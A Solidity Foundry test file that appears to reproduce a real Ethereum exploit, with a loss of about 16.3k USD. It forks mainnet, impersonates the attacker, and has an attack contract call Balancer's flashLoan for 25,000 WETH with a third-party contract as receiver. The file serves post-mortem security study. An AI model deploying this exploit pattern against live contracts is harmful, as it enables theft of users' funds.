pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 16.3k USD
// Attacker : https://bscscan.com/address/0xe60329a82c5add1898ba273fc53835ac7e6fd5ca
// Attack Contract : 
// Vulnerable Contract : https://etherscan.io/address/0x050163597d9905ba66400f7b3ca8f2ef23df702d
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x586a2a4368a1a45489a8a9b4273509b524b672c33e6c544d2682771b44f05e87

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x050163597d9905ba66400f7b3ca8f2ef23df702d

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1854357930382156107
// Twitter Guy : https://x.com/TenArmorAlert/status/1854357930382156107
// Hacking God : N/A

address constant weth9 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant ProtocolFeesCollector = 0xce88686553686DA562CE7Cea497CE749DA109f9F;
address constant attacker = 0xEE4073183E07Aa0FC1B96D6308793840f02B6e88;
address constant addr1 = 0x931b8905C310Ab133373f50ba66FEba2793F80eA;
address constant addr2 = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 21132838 - 1);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.flashLoan();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0xBA12222222228d8Ba445958a75a0704d566BF2C8
contract AttackerC {
    address private constant VAULT = addr2;
    address private constant RECEIVER = addr1;
    address private constant WETH = weth9;

    function flashLoan() public {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 25000 * 1e18;
        bytes memory userData = "";

        (bool ok, ) = VAULT.call(
            abi.encodeWithSelector(
                IBalancerVaultLocal.flashLoan.selector,
                RECEIVER,
                tokens,
                amounts,
                userData
            )
        );
        require(ok, "flashLoan failed");
    }
  
    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
    }
}

interface IWETH9 {
	function transfer(address, uint256) external returns (bool);
	function balanceOf(address) external returns (uint256); 
}
interface IProtocolFeesCollector {
	function getFlashLoanFeePercentage() external returns (uint256); 
}

interface IBalancerVaultLocal {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}